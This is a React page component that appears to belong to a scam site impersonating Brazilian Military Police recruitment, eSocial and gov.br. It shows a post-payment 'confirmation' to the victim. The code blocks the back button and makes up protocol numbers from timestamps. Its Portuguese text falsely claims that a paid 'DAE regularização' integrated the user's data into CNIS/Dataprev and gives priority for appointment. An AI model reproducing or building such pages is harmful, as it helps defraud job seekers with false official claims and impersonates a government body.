import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { CheckCircle2, Shield } from 'lucide-react';
import orgLogo from '@assets/logo-mj_1779836627251.png';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface UserInfo {
  firstName: string;
  fullName: string;
  cpf: string;
  cargo: string;
  gender: string;
  telefone: string;
  email: string;
}

const g = (gender: string, m: string, f: string) =>
  gender.toLowerCase().startsWith('f') ? f : m;

export default function ESocialConfirmadoPage() {
  const [, navigate] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const nomeCompleto = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
  const [userInfo, setUserInfo] = useState<UserInfo>({
    firstName: '', fullName: '', cpf: '', cargo: '', gender: 'M', telefone: '', email: '',
  });
  const [protocolNumber, setProtocolNumber] = useState('');
  const [dataConfirmacao, setDataConfirmacao] = useState('');

  // Block browser back navigation
  useEffect(() => {
    window.history.pushState(null, '', window.location.href);
    const blockBack = () => window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', blockBack);
    return () => window.removeEventListener('popstate', blockBack);
  }, []);

  useEffect(() => {
    window.scrollTo(0, 0);

    let parsedUser: any = null;
    let applicationData: any = null;

    try { parsedUser = JSON.parse(localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin') || 'null'); } catch (_) {}
    try { applicationData = JSON.parse(localStorage.getItem('applicationData') || 'null'); } catch (_) {}

    const fullName = parsedUser?.nomeCompleto || '';
    const rawFirst = fullName.split(' ')[0] || '';
    const firstName = rawFirst ? rawFirst.charAt(0).toUpperCase() + rawFirst.slice(1).toLowerCase() : '';
    const cpf = parsedUser?.cpf || '';
    const gender = parsedUser?.sexo || parsedUser?.genero || parsedUser?.gender || 'M';
    const telefone = parsedUser?.telefone || '';
    const email = parsedUser?.email || '';

    const CARGO_MAP: Record<string, string> = {
      'soldado-pm': 'Soldado de 2ª Classe PM',
      'oficial-pm': 'Aspirante-a-Oficial PM',
    };
    const positionId = applicationData?.positionId || applicationData?.position_id || '';
    const cargo =
      CARGO_MAP[positionId] ||
      applicationData?.positionTitle ||
      parsedUser?.cargo ||
      'Soldado de 2ª Classe PM';

    setUserInfo({ firstName, fullName, cpf, cargo, gender, telefone, email });

    // Protocol number
    try {
      const payment = JSON.parse(localStorage.getItem('esocialPaymentConfirmed') || 'null');
      if (payment?.transactionId) {
        setProtocolNumber(sigla + '-' + payment.transactionId.substring(0, 10).toUpperCase());
      } else {
        setProtocolNumber(sigla + '-' + Date.now().toString(36).toUpperCase());
      }
    } catch (_) {
      setProtocolNumber(sigla + '-' + Date.now().toString(36).toUpperCase());
    }

    // Confirmation deadline (+2 business days)
    const agora = new Date();
    agora.setDate(agora.getDate() + 2);
    setDataConfirmacao(agora.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' }));
  }, [sigla]);

  const maskCPF = (cpf: string) => {
    if (!cpf || cpf.length < 11) return '•••.•••.•••-••';
    const c = cpf.replace(/\D/g, '');
    return `${c.slice(0, 3)}.•••.•••-${c.slice(-2)}`;
  };

  const n = userInfo.firstName;
  const ela = g(userInfo.gender, 'o', 'a');
  const aprov = g(userInfo.gender, 'aprovado', 'aprovada');
  const hab = g(userInfo.gender, 'habilitado', 'habilitada');

  return (
    <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
      <ExercitoHeader customTitle={`Concurso ${sigla} 2026 · eSocial`} customSubtitle="Regularização DAE — Etapa Concluída" block_name={false} />

      <div className="flex-1 py-8">
        <div className="max-w-xl mx-auto px-4 space-y-6">

          {/* Cabeçalho de confirmação */}
          <div className="flex items-start gap-3 border-b border-gray-200 pb-4">
            <CheckCircle2 className="w-8 h-8 text-[#168821] flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-xs text-[#168821] font-semibold uppercase tracking-wide">DAE-{sigla} · Pagamento Confirmado</p>
              <h1 className="text-lg font-bold text-gray-800">
                {n ? `${n}, sua integração cadastral foi processada.` : 'Sua integração cadastral foi processada.'}
              </h1>
              <p className="text-xs text-gray-500 mt-0.5">
                Protocolo: <span className="font-mono font-semibold text-gray-700">{protocolNumber}</span> · CPF: {maskCPF(userInfo.cpf)}
              </p>
            </div>
          </div>

          {/* Corpo */}
          <div className="space-y-4 text-sm text-gray-700 leading-relaxed">

            <p>
              {n ? `${n}, a` : 'A'} partir deste momento, seus dados pessoais e funcionais encontram-se devidamente integrados aos sistemas da {sigla}. A regularização abrange os módulos de Controle de Pessoal, CNIS/Dataprev e a base de dados do Concurso {sigla} 2026, conforme exigido pelo processo seletivo ao qual você está inscrit{ela}.
            </p>

            <p>
              Isso significa que, caso você seja {aprov} na avaliação para o cargo de <strong>{userInfo.cargo}</strong>, o registro do vínculo funcional poderá ocorrer de forma imediata, sem necessidade de aguardar os trâmites burocráticos convencionais que normalmente levam de 30 a 90 dias úteis. A pré-integração realizada nesta etapa elimina as principais barreiras operacionais que retardam a posse e o exercício do cargo.
            </p>

            <div className="bg-gray-50 border-l-4 border-[#0063AF] p-4 rounded-r-lg">
              <p className="font-semibold text-[#004D8C] mb-2">O que acontece agora</p>
              <p>
                Nos próximos <strong>2 a 3 dias úteis</strong>, a equipe de coordenação da {sigla} irá processar sua inscrição e verificar a conformidade dos dados integrados. Após essa etapa de validação interna, você receberá uma mensagem de confirmação com todos os detalhes necessários para comparecer no dia da avaliação.
              </p>
            </div>

            <p>
              A comunicação oficial será encaminhada por <strong>WhatsApp</strong>
              {userInfo.telefone ? ` para o número ${userInfo.telefone}` : ' para o número de telefone cadastrado no seu perfil'}
              {userInfo.email ? ` e por e-mail para ${userInfo.email}` : ' e por e-mail para o endereço eletrônico informado no cadastro'}.
              Recomendamos que você mantenha essas formas de contato acessíveis e verifique com regularidade, inclusive a caixa de spam no caso do e-mail.
            </p>

            <p>
              A mensagem de confirmação conterá: data e horário da avaliação, endereço completo do local de prova, número do protocolo oficial de inscrição, o cargo para o qual você está concorrendo, orientações sobre o que levar no dia e o código de verificação de autenticidade do seu cadastro integrado.
            </p>

            <div className="bg-gray-50 border-l-4 border-amber-400 p-4 rounded-r-lg">
              <p className="font-semibold text-gray-800 mb-2">O que levar no dia da prova</p>
              <ul className="space-y-1.5 text-sm text-gray-700">
                <li>• <strong>Documento de identificação oficial com foto</strong> — RG, CNH ou Passaporte (documentos digitais podem ser apresentados como complemento)</li>
                <li>• <strong>CPF</strong> — original ou cópia simples</li>
                <li>• <strong>Comprovante de inscrição</strong> — será enviado junto à mensagem de confirmação; imprima ou salve na galeria do celular</li>
                <li>• <strong>Caneta esferográfica de tinta preta ou azul</strong> — lápis e canetas com tinta que apague não são permitidos</li>
                <li>• Chegue com pelo menos <strong>30 minutos de antecedência</strong> — os portões são fechados no horário exato de início e não há reentrada após o fechamento</li>
              </ul>
            </div>

            <div className="bg-gray-50 border-l-4 border-[#168821] p-4 rounded-r-lg">
              <p className="font-semibold text-gray-800 mb-2">Prazo para receber a confirmação</p>
              <p>
                O prazo estimado para envio da mensagem com os dados da prova é de até <strong>2 dias úteis</strong> a partir desta data. Em casos de alto volume de inscrições, esse prazo pode ser estendido para até <strong>5 dias úteis</strong>, sem que isso implique qualquer irregularidade no seu cadastro. Se você não receber nenhuma comunicação até <strong>{dataConfirmacao}</strong>, verifique a caixa de spam antes de solicitar suporte.
              </p>
            </div>

            <p>
              É importante ressaltar que a regularização da sua integração cadastral <strong>não garante a aprovação</strong> na avaliação, tampouco constitui aprovação antecipada ou reserva de vaga. O processo seletivo seguirá seus critérios objetivos, e a integração realizada nesta etapa serve exclusivamente para agilizar os procedimentos administrativos de posse dos candidatos {aprov}s dentro do número de vagas disponíveis.
            </p>

            <p>
              Candidatos que realizaram a integração e forem {aprov}s têm prioridade operacional no processamento do vínculo funcional. Enquanto candidatos sem integração prévia aguardam análise cadastral após o resultado, você já estará com toda a documentação eletrônica processada e pronta para ativação imediata.
            </p>

            <p>
              Para dúvidas sobre o processo seletivo, condições de participação ou critérios de avaliação, acesse o portal oficial da {sigla} em <strong>gov.br</strong>. Não compartilhe seu número de protocolo com terceiros, pois ele está vinculado exclusivamente à sua identidade cadastral.
            </p>

            <p className="text-xs text-gray-500 border-t border-gray-100 pt-4">
              Integração processada em conformidade com a legislação federal e as normas da {sigla} para o Concurso Público 2026. Os dados informados são tratados nos termos da Lei nº 13.709/2018 (LGPD). Protocolo: {protocolNumber}.
            </p>
          </div>

          <div className="flex items-center justify-center gap-4 text-xs text-gray-400 pt-2 pb-4">
            <span className="flex items-center gap-1">
              <Shield className="w-3 h-3" />
              Dados protegidos pela LGPD
            </span>
          </div>

          <div className="flex justify-center pb-6">
            <img src={orgLogo} alt={nomeCompleto} className="h-10 opacity-70 object-contain" />
          </div>

        </div>
      </div>
    </div>
  );
}
